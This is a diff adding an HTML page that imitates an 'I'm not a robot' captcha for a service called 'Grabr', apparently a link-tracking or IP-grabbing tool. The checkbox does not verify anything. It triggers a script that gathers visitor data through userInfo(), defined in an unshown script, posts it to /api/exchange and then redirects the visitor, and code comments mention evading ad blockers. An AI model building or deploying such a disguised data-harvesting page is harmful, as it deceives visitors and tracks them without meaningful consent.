@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading... </title>
+    <link rel="icon" href="/cdn/world.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;1,400;1,500&display=swap");
+      body {
+        width: 100vw;
+        height: 100vh;
+        background-color: #f2f2f352;
+        margin: 0px;
+        padding: 0px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+      * {
+        font-family: Roboto, Arial, sans-serif;
+      }
+      a {
+        color: #565656;
+        text-decoration: none;
+        opacity: 0.83;
+      }
+      a:hover {
+        text-decoration: underline;
+      }
+      .main {
+        display: flex;
+        gap: 4px;
+        flex-direction: column;
+      }
+      .captcha {
+        border: 1px solid #d0d0d0;
+        background-color: #f9f9f9;
+        width: 277px;
+        height: 65px;
+        border-radius: 3px;
+        display: flex;
+        gap: 10px;
+        align-items: center;
+        font-size: 15px;
+        transition: transform 0.3s;
+      }
+      .captcha .box {
+        width: 20px;
+        height: 20px;
+        background-color: white;
+        border: 2px solid #b7b6b7;
+        border-radius: 2px;
+        margin-left: 12px;
+      }
+      .captcha .box:hover {
+        border-color: #a2a2a2;
+      }
+      .captcha .box:active {
+        background-color: #0000000f;
+      }
+      .loading {
+        cursor: progress;
+      }
+      .loading .box {
+        border-radius: 50px;
+        border: 4px solid #d3e0f5;
+        border-right: 4px solid #4285f4;
+        background-color: transparent;
+        animation: load 1s infinite linear;
+        margin-left: 9px;
+        pointer-events: none;
+      }
+      .loading .col {
+        opacity: 0.5;
+        pointer-events: none;
+      }
+      .loading .captcha {
+        transform: scale(1.02);
+      }
+      .captcha span {
+        pointer-events: none;
+
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+
+      .col {
+        display: flex;
+        align-items: center;
+        transition: opacity 0.3s;
+      }
+      .col p {
+        color: #9f9f9f;
+        font-size: 11px;
+        max-width: 200px;
+      }
+      .col button {
+        margin-left: auto;
+        background-color: #c9c9c9;
+        padding: 7px 12px;
+        border: none;
+        color: white;
+        border-radius: 7px;
+        filter: grayscale(1);
+        cursor: not-allowed;
+      }
+      @keyframes load {
+        from {
+          transform: rotate(0deg);
+        }
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main">
+      <div class="captcha" onclick="document.body.classList.add('loading');start()">
+        <div class="box" aria-role="button" tabindex="1"></div>
+        <span>I'm not a robot</span>
+      </div>
+      <div class="col">
+        <p>
+          Protected by <a href="/" target="_blank">Grabr</a>. Pressing "I'm not a robot" accepts
+          our <a href="/legal/links">Link Privacy Policy</a>.
+        </p>
+        <button>Continue</button>
+      </div>
+    </div>
+  </body>
+  <script src="/cdn/script.js"></script>
+  <script>
+    var data = false;
+    userInfo().then(e => data = e)
+    const start = function () {
+      var ii = setTimeout(function () {
+        if (data) {
+          clearInterval(ii);
+          run()
+        }
+      })
+    }
+    const run = async function () {
+      console.log("data going throught", data)
+      // fetch server with ID
+      // server returns url
+      // to avoid getting adblocked
+      // and remain compliant
+      console.log("fetching...")
+      const url = await (await fetch("/api/exchange?id=%id%", {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(data)
+})).json();
+      console.log("fetched")
+      location.href = url.url
+    }
+  </script>
+</html>
